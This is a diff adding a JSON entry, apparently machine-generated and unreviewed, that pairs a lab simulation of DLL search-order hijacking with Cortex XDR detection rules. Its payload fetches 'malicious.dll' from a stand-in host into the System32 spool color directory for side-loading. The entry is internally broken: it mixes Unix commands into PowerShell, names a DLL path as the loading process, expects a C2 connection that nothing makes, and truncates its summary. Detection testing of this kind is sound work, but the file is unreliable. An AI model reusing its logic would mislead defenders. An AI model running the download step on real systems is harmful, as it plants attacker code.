@@ -1,0 +1,152 @@
+{
+  "id": "TTP-0000-0016",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "source-not-recorded"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Uncommon DLL Side-Loaded into Microsoft Process via Search-Order Hijack",
+    "summary": "An attacker places a rarely-seen DLL signed by an uncommon vendor into a directory that is searched before Microsoft's directories, causing a Microsoft-signed process to load it. Cortex should detect ",
+    "description": "An attacker places a rarely-seen DLL signed by an uncommon vendor into a directory that is searched before Microsoft's directories, causing a Microsoft-signed process to load it. Cortex should detect this hijacking event and flag the uncommon DLL signer."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1574",
+        "subtechnique_id": "T1574.001",
+        "name": "Hijack Execution Flow: DLL Search Order Hijacking / Side-Loading",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir -p C:\\Windows\\System32\\spool\\drivers\\color\nwget -O C:\\Windows\\System32\\spool\\drivers\\color\\msvcr120.dll https://example.com/malicious.dll\nstub chmod +x C:\\Windows\\System32\\spool\\drivers\\color\\msvcr120.dll\nstub exec C:\\Windows\\System32\\spool\\drivers\\color\\msvcr120.dll\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "Suspicious DLL placed in hijack location",
+        "expected_value": "action_file_path = 'C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\msvcr120.dll'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Microsoft process loading hijacked DLL",
+        "expected_value": "actor_process_image_name = 'C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\msvcr120.dll'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "C2 connection to TEST-NET-1",
+        "expected_value": "action_remote_ip = '192.0.2.1'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "A rare DLL signed by an uncommon vendor was hijacked into a Microsoft process",
+        "description": "Detection of a DLL with uncommon signing authority loaded into a Microsoft process via search-order hijack",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name contains 'Microsoft'\n| filter action_file_path contains 'spool/drivers/color'\n| filter action_file_path contains 'msvcr120.dll'\n| filter action_file_path contains 'C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\msvcr120.dll'",
+        "mitre_technique_ids": [
+          "T1574.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "A rare DLL signed by an uncommon vendor was hijacked into a Microsoft process",
+        "description": "Machine learning model detecting unusual DLL loading behavior into Microsoft processes",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name contains 'Microsoft'\n| filter action_file_path contains 'spool/drivers/color'\n| filter action_file_path contains 'msvcr120.dll'\n| filter action_file_path contains 'C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\msvcr120.dll'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "process_start_with_uncommon_dll",
+        "mitre_technique_ids": [
+          "T1574.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Hijack detection in Microsoft process",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name contains 'Microsoft'\n| filter action_file_path contains 'spool/drivers/color'\n| filter action_file_path contains 'msvcr120.dll'\n| filter action_file_path contains 'C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\msvcr120.dll'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — A rare DLL signed by an uncommon vendor was hijacked into a Microsoft process; Required Data: XDR Agent; ATT&CK T1574.001. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1574.001",
+      "url": "https://attack.mitre.org/techniques/T1574/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
